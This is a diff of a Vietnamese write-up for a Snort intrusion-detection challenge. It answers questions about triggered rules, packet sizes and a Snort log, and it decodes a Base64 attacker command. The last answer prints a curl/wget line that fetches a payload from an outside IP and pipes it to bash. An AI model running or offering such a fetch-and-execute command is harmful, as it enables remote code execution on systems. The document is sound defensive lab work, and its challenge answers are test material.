@@ -13,7 +13,7 @@ Sử dụng tệp quy tắc được cung cấp ( local.rules ) để điều tr
 
 Có bao nhiêu quy tắc đã được kích hoạt?
 **Mỗi alert có 1 sid riêng**
-![alt text](../png/snc20.png)
+![alt text](../png/SnortChall/snc20.png)
 4
 
 
@@ -28,7 +28,7 @@ Sáu chữ số đầu tiên của sid quy tắc được kích hoạt là gì?
 Sử dụng  tệp local-1.rules  trống để viết quy tắc mới nhằm phát hiện các gói tin có kích thước từ 770 đến 855 byte .
 
 Số lượng gói tin được phát hiện là bao nhiêu?
-![alt text](../png/snc21.png)
+![alt text](../png/SnortChall/snc21.png)
 >41
 
 
@@ -38,7 +38,7 @@ Số lượng gói tin được phát hiện là bao nhiêu?
 Tên của thuật toán mã hóa được sử dụng là gì ?
 
 **Dùng** `sudo strings snort.log.1689857521`
-![alt text](../png/snc22.png)
+![alt text](../png/SnortChall/snc22.png)
 >**Base64**
 
 
@@ -46,7 +46,7 @@ Tên của thuật toán mã hóa được sử dụng là gì ?
 
 ID IP của gói tin tương ứng là  gì ? 
 **Dùng** `sudo strings alert | grep -e 45.155.205.233 -e ID`
-![alt text](../png/snc23.png)
+![alt text](../png/SnortChall/snc23.png)
 
 > **62808** 
 
@@ -57,9 +57,9 @@ Giải mã lệnh được mã hóa.
 
 Lệnh của kẻ tấn công là gì?
 **B1**
-![alt text](../png/snc24.png)
+![alt text](../png/SnortChall/snc24.png)
 **B2** giải mã
-![alt text](../png/snc25.png)
+![alt text](../png/SnortChall/snc25.png)
 >**(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash**
 
 
